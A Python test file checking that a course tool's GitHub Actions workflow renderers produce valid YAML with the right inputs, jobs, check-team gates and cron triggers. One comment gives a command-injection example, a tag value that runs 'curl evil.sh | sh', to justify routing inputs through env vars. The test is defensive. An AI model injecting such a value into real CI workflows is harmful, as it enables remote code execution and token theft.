"""The workflow renderers must emit GitHub-parseable YAML with the right inputs/jobs.

A typo in any of these silently breaks a faculty button for every course, so the cheapest
useful guard is: render -> yaml.safe_load -> assert the contract. No network.
"""

from __future__ import annotations

import pytest
import yaml

from conftest import workflow_inputs, workflow_jobs
from dsl_course import (
    discovery,
    profile_readme,
    release_budget,
    seed,
    workflows_render,
)

# Every workflow renderer, rendered -> a "it parses, and it's gated" sweep. Completeness
# is enforced by test_every_renderer_is_covered_by_the_yaml_sweep below, so a new button
# cannot ship without passing through yaml.safe_load.
ALL_RENDERED = {
    "release": workflows_render.render_release(
        ["Cohort-f2026"], ["1", "2"], ["lectures", "labs"]
    ),
    "central_release": workflows_render.render_central_release(
        ["course-materials-f2026"], ["Cohort-f2026"]
    ),
    "provision": workflows_render.render_provision(
        ["Cohort-f2026"], ["assignment-1-f2026"]
    ),
    "grade_assignment": workflows_render.render_grade_assignment(
        ["Cohort-f2026"], ["assignment-1-f2026"]
    ),
    "release_code": workflows_render.render_release_code(["Cohort-f2026"], ["materials"]),
    "sync_membership": workflows_render.render_sync_membership(["Cohort-f2026"]),
    "send_codes": workflows_render.render_send_codes(["Cohort-f2026"]),
    "sync_gradebooks": workflows_render.render_sync_gradebooks(["Cohort-f2026"]),
    "render_grades": workflows_render.render_render_grades(["Cohort-f2026"]),
    "distribute_grades": workflows_render.render_distribute_grades(["Cohort-f2026"]),
    "bootstrap_cohort": workflows_render.render_bootstrap_cohort(),
    "refresh": workflows_render.render_refresh(),
    "new_materials": workflows_render.render_new_materials(),
    "new_assignment": workflows_render.render_new_assignment(),
    "sync_site": workflows_render.render_sync_site(["Cohort-f2026"]),
    "publish_site": workflows_render.render_publish_site(["course-materials-f2026"]),
    "status": workflows_render.render_status(["Cohort-f2026"]),
    "scheduler": workflows_render.render_scheduler(),
}

# The only renderer with no check-team gate: cron runs have no actor to check, and the
# scheduler just re-calls the idempotent release functions.
UNGATED = {"scheduler"}


@pytest.mark.parametrize("name", sorted(ALL_RENDERED))
def test_renders_valid_yaml(name):
    doc = yaml.safe_load(ALL_RENDERED[name])
    assert isinstance(doc, dict) and doc.get("name")
    # Every faculty workflow is a workflow_dispatch with a check-team gate.
    assert ("check-team" in workflow_jobs(ALL_RENDERED[name])) is (name not in UNGATED)


def test_every_renderer_is_covered_by_the_yaml_sweep():
    # A renderer that never gets yaml.safe_load'ed can ship a typo that breaks a faculty
    # button in every course org, so the sweep above must cover ALL of them by name.
    renderers = {
        n.removeprefix("render_")
        for n in vars(workflows_render)
        if n.startswith("render_")
    }
    assert renderers == set(ALL_RENDERED)


def test_publish_site_inputs():
    inp = workflow_inputs(
        workflows_render.render_publish_site(
            ["course-materials-f2026", "course-materials-f2025"]
        )
    )
    assert set(inp) == {"source_repo", "readings_mode", "include_lectures"}
    assert inp["source_repo"]["options"] == [
        "course-materials-f2026",
        "course-materials-f2025",
    ]
    assert inp["readings_mode"]["options"] == [
        "reading-list",
        "actual-readings",
        "none",
    ]
    assert inp["readings_mode"]["default"] == "reading-list"
    assert inp["include_lectures"]["type"] == "boolean"


def test_publish_site_has_publish_job_running_public_sync():
    rendered = workflows_render.render_publish_site(["course-materials-f2026"])
    assert "publish" in workflow_jobs(rendered)
    assert "dsl_course.site public-sync" in rendered
    # include_lectures off must map to the CLI flag.
    assert "--no-include-lectures" in rendered


def test_publish_site_cron_resyncs_from_persisted_settings():
    # The only flow that used to need a human re-click: a daily cron now re-runs the last
    # publish's persisted settings (public-sync with no source args), while the manual
    # button keeps its inputs and its check-team gate exactly as before.
    rendered = workflows_render.render_publish_site(["course-materials-f2026"])
    doc = yaml.safe_load(rendered)
    trigger = doc.get("on", doc.get(True))
    assert trigger["schedule"] == [{"cron": "30 5 * * *"}]
    assert "workflow_dispatch" in trigger
    jobs = workflow_jobs(rendered)
    resync = jobs["resync"]
    assert resync["if"] == "github.event_name == 'schedule'"
    assert "needs" not in resync  # cron has no actor, so it skips the check-team gate
    run = resync["steps"][-1]["run"]
    assert "python3 -m dsl_course.site public-sync --course-org" in run
    assert "--source-repo" not in run  # no inputs: the settings come from the site repo
    assert jobs["publish"]["needs"] == "check-team"


def test_provision_has_group_toggle():
    inp = workflow_inputs(
        workflows_render.render_provision(["Cohort-f2026"], ["assignment-4-project-f2026"])
    )
    assert inp["group"]["type"] == "boolean"
    assert inp["group"]["default"] is False
    assert "--group" in workflows_render.render_provision(["Cohort-f2026"], [])


def test_grade_assignment_calls_collect_with_no_deadline_input():
    # SSOT: the grading deadline comes from the cohort schedule, so the button has no
    # deadline input and never passes --deadline (collect derives it).
    rendered = workflows_render.render_grade_assignment(
        ["Cohort-f2026"], ["assignment-1-f2026"]
    )
    inp = workflow_inputs(rendered)
    assert "deadline" not in inp and inp["group"]["type"] == "boolean"
    assert "dsl_course.collect" in rendered
    assert "--group" in rendered and "--deadline" not in rendered


def test_mail_buttons_and_cohort_bootstrap_carry_the_mail_env():
    # The send buttons need the mail secrets to SEND; "Bootstrap cohort" needs them to
    # PROPAGATE them onto the new cohort org (bootstrap_course.propagate_mail_secrets),
    # which is also what makes a re-run repair a cohort that predates them.
    from dsl_course import bootstrap_course as bc

    for name in ("send_codes", "distribute_grades", "bootstrap_cohort"):
        step = workflow_jobs(ALL_RENDERED[name])[
            "send-codes" if name == "send_codes" else name.replace("_", "-")
        ]["steps"][-1]
        assert set(bc.MAIL_SECRETS) <= set(step["env"]), name
        for secret in bc.MAIL_SECRETS:
            assert step["env"][secret] == f"${{{{ secrets.{secret} }}}}", (name, secret)


def test_sync_membership_is_a_consolidated_reconcile():
    # One consolidated, fully-automatic reconcile (roster + teams + faculty) - no
    # --prune toggle at this level, config is always the live truth.
    rendered = workflows_render.render_sync_membership(["Cohort-f2026"])
    inp = workflow_inputs(rendered)
    assert set(inp) == {"cohort_org"}
    assert inp["cohort_org"]["default"] == workflows_render._FACULTY_ONLY
    assert inp["cohort_org"]["options"] == [workflows_render._FACULTY_ONLY, "Cohort-f2026"]
    assert "dsl_course.sync_membership" in rendered
    assert "--prune" not in rendered
    jobs = workflow_jobs(rendered)
    assert {"check-team", "sync-dispatch", "sync-auto"} <= set(jobs)
    trigger = yaml.safe_load(rendered).get("on", yaml.safe_load(rendered).get(True))
    assert set(trigger) == {"push", "repository_dispatch", "schedule", "workflow_dispatch"}


def test_dotgithub_readme_orients_faculty():
    # The .github repo's own README points faculty at the Actions tab where the buttons live.
    course = profile_readme.render_dotgithub_readme(
        "My-Course-E1", "My Course", is_cohort=False
    )
    assert "control panel" in course
    assert "My-Course-E1/.github/actions" in course
    # A cohort org sends faculty to the parent course org for the buttons instead.
    cohort = profile_readme.render_dotgithub_readme(
        "My-Course-f2026", "My Course", is_cohort=True
    )
    assert "parent course org" in cohort


def test_release_has_a_checkbox_and_path_field_per_section():
    rendered = workflows_render.render_release(["Cohort-f2026"], ["1", "2"], ["lectures", "labs"])
    inp = workflow_inputs(rendered)
    assert set(inp) == {
        "cohort_org",
        "release_lectures",
        "lectures_path",
        "release_labs",
        "labs_path",
        "sessions",
        "include_root_files",
    }
    # Checkbox defaults on; path has no default (blank means "use the section's own name").
    assert inp["release_lectures"]["type"] == "boolean"
    assert inp["release_lectures"]["default"] is True
    assert "default" not in inp["lectures_path"]
    # Syllabus + README are one merged toggle (each section already costs 2 inputs,
    # so this saves a slot rather than keeping them separate).
    assert inp["include_root_files"]["type"] == "boolean"
    # Sessions is free text (no multi-select widget in workflow_dispatch), with the
    # discovered sessions surfaced in the description for reference.
    assert "type" not in inp["sessions"]
    assert "1, 2" in inp["sessions"]["description"]
    # No standalone cohort_repo dropdown - destination routing replaces it.
    assert "cohort_repo" not in inp


def test_release_builds_destinations_from_checkbox_and_path_fields():
    rendered = workflows_render.render_release(["Cohort-f2026"], ["1"], ["lectures", "labs"])
    assert "RELEASE_LECTURES: ${{ inputs.release_lectures }}" in rendered
    assert "PATH_LECTURES: ${{ inputs.lectures_path }}" in rendered
    # Unchecked -> not released regardless of path; checked with a blank path ->
    # falls back to the section's own name via bash parameter expansion.
    assert (
        '[ "$RELEASE_LECTURES" = "true" ] && destinations="$destinations lectures=${PATH_LECTURES:-lectures}"'
        in rendered
    )
    assert '--destinations "$destinations"' in rendered
    assert "--sessions \"$SESSIONS\"" in rendered


def test_release_rejects_sections_that_collide_on_env_var_name():
    # Shell env var names can't hold hyphens, so section names are folded ('-' -> '_')
    # to build them - two sections differing only by hyphen vs underscore would
    # otherwise silently share one env var and drop a destination.
    with pytest.raises(ValueError, match="case-studies.*case_studies|case_studies.*case-studies"):
        workflows_render.render_release(["Cohort-f2026"], ["1"], ["case-studies", "case_studies"])


def test_central_release_shares_checkbox_and_path_fields_with_the_repo_button():
    # sections here represent the union discovered across every content repo in the
    # org (computed by the caller, seed_github_workflows) - the central button no
    # longer has a separate cohort_repo/exclude fallback.
    rendered = workflows_render.render_central_release(
        ["course-materials-f2026"], ["Cohort-f2026"], ["lectures", "labs"]
    )
    inp = workflow_inputs(rendered)
    assert {"source_repo", "cohort_org", "release_lectures", "lectures_path", "sessions"} <= set(inp)
    assert "cohort_repo" not in inp
    assert "exclude" not in inp


def test_max_release_sections_caps_at_ten_input_budget():
    # 4 fixed inputs (cohort_org, sessions, include_root_files, source_repo) + 2 per
    # section must not exceed GitHub's 10-input cap on the tighter (central) button.
    assert 4 + 2 * release_budget.MAX_RELEASE_SECTIONS <= 10


def test_release_input_budget_matches_what_the_central_button_renders():
    # The whole point of deriving MAX_RELEASE_SECTIONS (rather than hard-coding 3) is
    # that adding a fixed input can't silently eat a section slot. This is the tripwire:
    # the fixed-input list is checked against the inputs the tighter (central) button
    # ACTUALLY renders, and the section slots are checked against GitHub's 10-input cap.
    fixed = workflow_inputs(
        workflows_render.render_central_release(["m"], ["Cohort-f2026"], [])
    )
    assert set(fixed) == set(release_budget.FIXED_RELEASE_INPUTS), (
        "the central Release button's fixed inputs changed - update "
        "release_budget.FIXED_RELEASE_INPUTS so the section budget is recomputed"
    )
    sections = [f"section{i}" for i in range(release_budget.MAX_RELEASE_SECTIONS)]
    full = workflow_inputs(
        workflows_render.render_central_release(["m"], ["Cohort-f2026"], sections)
    )
    assert len(full) == len(fixed) + release_budget.INPUTS_PER_SECTION * len(sections)
    assert len(full) <= release_budget.GITHUB_MAX_DISPATCH_INPUTS
    # ...and the budget is saturated: one more section would break the button outright.
    over = workflow_inputs(
        workflows_render.render_central_release(["m"], ["Cohort-f2026"], sections + ["extra"])
    )
    assert len(over) > release_budget.GITHUB_MAX_DISPATCH_INPUTS


def test_seed_exports_exactly_what_its_callers_reach_for():
    # seed.__all__ IS the contract now: the names other modules use as `seed.<name>`
    # (site, scaffold, bootstrap_course, sync_faculty, sync_membership). Pinned here, so
    # trimming one that a caller still uses fails loudly instead of at runtime.
    assert set(seed.__all__) == {
        "seed_github_workflows",
        "_push_workflows",
        "COHORTS_PATH",
        "discover_assignments",
        "discover_cohort_repos",
        "discover_cohorts",
        "discover_content_repos",
        "discover_release_sources",
        "discover_sessions",
        "register_cohort",
        "update_profile_readme",
    }
    for name in seed.__all__:
        assert getattr(seed, name, None) is not None, f"seed.{name} does not resolve"
    # ...and they are the real thing, not a stale copy.
    assert seed.discover_release_sources is discovery.discover_release_sources
    assert seed.update_profile_readme is profile_readme.update_profile_readme


def test_cap_sections_logs_and_truncates_past_the_limit(capsys):
    capped = release_budget.cap_sections(
        ["lectures", "labs", "readings", "handouts"], "org/repo"
    )
    assert capped == ["handouts", "labs", "lectures"]  # sorted, first 3
    err = capsys.readouterr().err
    assert "readings" in err and "org/repo" in err


def test_scaffold_buttons_route_inputs_through_env_not_the_shell():
    # GitHub substitutes ${{ inputs.x }} BEFORE the shell parses the run block, so a tag
    # like `x; curl evil.sh | sh` would execute in a runner holding DSL_BOT_TOKEN. Every
    # user-supplied input must reach the script as an env var instead.
    materials, assignment = workflows_render.render_new_materials(), workflows_render.render_new_assignment()
    for rendered in (materials, assignment):
        step = workflow_jobs(rendered)["scaffold"]["steps"][-1]
        assert "${{" not in step["run"]
        assert step["env"]["TAG"] == "${{ inputs.tag }}"
    assert '--tag "$TAG"' in materials
    assert '--number "$NUMBER"' in assignment


def test_bootstrap_org_workflow_routes_inputs_through_env_not_the_shell():
    from pathlib import Path

    wf = (
        Path(__file__).resolve().parents[1] / ".github" / "workflows" / "bootstrap-org.yml"
    ).read_text()
    step = yaml.safe_load(wf)["jobs"]["bootstrap"]["steps"][-1]
    assert "${{" not in step["run"]
    assert step["env"]["ORG"] == "${{ inputs.org }}"
    assert step["env"]["ORG_NAME"] == "${{ inputs.org_name }}"
    assert step["env"]["COURSE_CODE"] == "${{ inputs.course_code }}"


def test_choice_falls_back_when_empty():
    # An empty dropdown must still be valid YAML (a placeholder option), never blank.
    assert "(none-yet)" in workflows_render._choice([])
    inp = workflow_inputs(workflows_render.render_publish_site([]))
    assert inp["source_repo"]["options"] == ["(none-yet)"]


def test_sync_site_auto_resyncs_on_sourced_changes():
    # Sync site must auto-fire (no manual click) on the things the site reads: a push to
    # the course dsl-course.yml, a repository_dispatch from a cohort's schedule.yml, and a
    # daily cron catch-all. The auto path is ungated (no check-team); manual stays gated.
    doc = yaml.safe_load(workflows_render.render_sync_site(["Cohort-f2026"]))
    trigger = doc.get("on", doc.get(True))
    assert "dsl-course.yml" in trigger["push"]["paths"]
    assert trigger["repository_dispatch"]["types"] == ["sync-site"]
    assert trigger["schedule"][0]["cron"] == "0 6 * * *"
    assert "workflow_dispatch" in trigger
    jobs = doc["jobs"]
    # the ungated auto job runs for non-manual events; the gated one needs check-team
    assert jobs["sync-auto"]["if"] == "github.event_name != 'workflow_dispatch'"
    assert "check-team" not in jobs["sync-auto"].get("needs", "")
    assert jobs["sync"]["needs"] == "check-team"


def test_classroom_config_site_dispatcher_fires_on_schedule_change():
    from pathlib import Path

    tmpl = (
        Path(__file__).resolve().parents[1]
        / "templates" / "classroom-config" / "dispatch-sync-site.yml"
    ).read_text()
    doc = yaml.safe_load(tmpl)
    trigger = doc.get("on", doc.get(True))
    assert trigger["push"]["paths"] == ["schedule.yml"]
    assert "sync-site" in tmpl  # dispatches the sync-site event
